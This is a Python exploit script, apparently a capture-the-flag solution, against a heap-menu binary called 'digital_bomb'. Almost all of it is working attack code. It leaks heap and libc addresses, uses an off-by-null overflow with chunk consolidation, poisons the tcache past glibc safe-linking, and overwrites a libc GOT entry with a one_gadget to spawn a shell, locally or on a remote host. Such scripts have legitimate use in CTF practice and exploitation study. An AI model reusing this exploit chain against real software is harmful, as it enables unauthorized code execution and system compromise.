#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Title : Linux Pwn Exploit
# Author: Axura (@4xura) - https://4xura.com
#
# Description:
# ------------
# A Python exp for Linux binex interaction
#
# Usage:
# ------
# - Local mode  : ./xpl.py
# - Remote mode : ./xpl.py [ <IP> <PORT> | <IP:PORT> ]
#

from pwnkit import *
from pwn import *
import sys

# CONFIG
# ------------------------------------------------------------------------
BIN_PATH   = "./digital_bomb"
LIBC_PATH  = "./libc.so.6"
elf        = ELF(BIN_PATH, checksec=False)
libc       = ELF(LIBC_PATH) if LIBC_PATH else None
host, port = parse_argv(sys.argv[1:], None, None)

Context(
    arch      = 'amd64',
    os        = 'linux',
    endian    = 'little',
    log_level = 'debug',
    terminal  = ('tmux', 'splitw', '-h')
).push()

io = Tube(
    file_path = BIN_PATH,
    libc_path = LIBC_PATH,
    host      = host,
    port      = port, 
    env       = {}
).init().alias() 
set_global_io(io)   # s, sa, sl, sla, r, ru, uu64
init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")

# HEAP 
# ------------------------------------------------------------------------
def menu(n: int):
    opt = itoa(n)
    sla(b"choice >>", opt)

def alloc(idx: int, sz: int, pl: bytes):
    """off by null"""
    idx, sz = map(itoa, (idx, sz))
    menu(1)
    sla(b'Index >> \n', idx)
    sla(b'Size >> \n', sz)
    s(pl)

def free(idx: int):
    menu(2)
    sla(b'Index >> \n', itoa(idx))

def edit(idx, pl):
    menu(666)
    sla(b'Index >> \n', itoa(idx))
    s(pl)

def show(idx):
    menu(3)
    sla(b'Index >> \n', itoa(idx))

# EXPLOIT
# ------------------------------------------------------------------------
def bomb(min, max, guess):
    sla(b'Enter min (0-500): ', itoa(min))
    sla(b'Enter max (0-500): ', itoa(max))
    sla(b'Your guess :', itoa(guess))

def xpl(**kwargs):
    """
    Gdb
    """
    # g("""
      # # menu
      # # brva 0x19DB       
      # # show
      # # brva 0x1811
      # # ignore 1 23
      # """)

    """
    Bypass bomb
    """
    bomb(1, 2, 2)

    """
    Heap fengshui
    """
    alloc(9, 0x500, b"U"*8)
    alloc(0, 0x4f0, b"a"*8)
    alloc(10, 0x500, b"a"*8)
    alloc(1, 0x4f0, b"a"*8)
    free(10)
    free(9)

    alloc(9, 0x500, b"a"*7)
    edit(9, b"a"*8)
    show(9)
    ru(b"a"*8)
    heap_base = uu64(r(6)) - 0x290
    pa(heap_base)

    free(0)
    free(1)
    free(9)

    """
    Off by null
    """
    fchk_addr = heap_base + 0x2a0
    fchk_sz = 0x600
    fchk_hdr = flat({
        0x8: fchk_sz|0x1,
        0x10: fchk_addr,
        0x18: fchk_addr,
        },filler=b'\0')
    alloc(0, 0x500, fchk_hdr)

    for i in range(1,10):
        """
        1   : off-by-null overflow + fake prev_size
        2   : victim chunk to be free'd for backward consolidation
        3~9 : exhaust 7 tcache slots
        """
        alloc(i, 0xf8, b"a"*8)  

    free(1)
    overflow = flat({
        0xf0: fchk_sz,
        },filler=b"a")
    alloc(1, 0xf8, overflow)

    for i in range(3,10):
        free(i)

    free(2) # consol fake chunk 0x600+0x100-> usbin 

    alloc(9, 0x4f8, b"U"*8)   # split usbin chunk -> write libc into unfree'd chunk
    show(1)
    ru(b"\n")
    libc_base = uu64(r(6)) - 0x21ace0
    pa(libc_base)
    
    """
    Tcache poisoning

    Construct tcache linking:
    0x200 [  2 ]: 0x5555555597b0 —▸ 0x5555555592b0 ◂— 0

    then we hijack tcache_perthread_struct by heap overflow (chunk overlapping)
    """
    free(9)     # 0x700 usbin
    alloc(8, 0x1f8, b"a"*8) # chunk1 hdr corrupted, cannot be put into tcache without padding
    free(8)     # tcache[0x200]
    free(1)     # usbin remainder chunk size: 0x200

    slk = SafeLinking(heap_base)
    # enc_chk8_fd = 0x000055500000c7e9
    # dec_chk8_fd = slk.decrypt(enc_fd)
    # pa(dec_fd)  # 0x5555555592b0
    """
    Encrypted with fd of chunk 8:
        0x5555555592a0  0x0000000000000000      0x0000000000000201      ................
        0x5555555592b0  0x0000000555555559      0xb8c72c4480f8183e      YUUU....>...D,..         <-- tcachebins[0x200][1/2]

    Then we hijack the chunk 1 fd ptr as tcache_perthread_struct+0x10
    """
    enc_fd = slk.encrypt(heap_base+0x10)
    pa(enc_fd)
    pl = flat({
        0x0: 0xdeadbeef,        
        0x2f0: [0x510, 0x201],  # fake prev_size + fake size
        0x300: enc_fd,
        })
    alloc(3, 0x4f0, pl)
    alloc(4, 0x1f8, b"a"*8)

    """
    Hijack libc got

    00:0000│  0x7ffff7fa7090 (*ABS*@got.plt) —▸ 0x7ffff7f2c040 (__strncpy_avx2)
    01:0008│  0x7ffff7fa7098 (*ABS*@got.plt) —▸ 0x7ffff7f2a7e0 (__strlen_avx2) ◂— TARGET
    bypass: "malloc(): unaligned tcache chunk detected"
    """
    libc_got = libc_base + 0x21a090
    pl = flat({
        0x80: 0,
        0x88: libc_got,  # tcache[0x30] @heap_base+0x98
        },filler=b"\x07\0")
    alloc(5, 0x1f8, pl)

    """
    One gadget:

    0xebc85 execve("/bin/sh", r10, rdx)
    constraints:
      address rbp-0x78 is writable
      [r10] == NULL || r10 == NULL || r10 is a valid argv
    """
    ogg = libc_base + 0xebc85
    alloc(6, 0x28, p64(ogg)*2)

    io.interactive()

# PIPELINE
# ------------------------------------------------------------------------
if __name__ == "__main__":
    xpl()

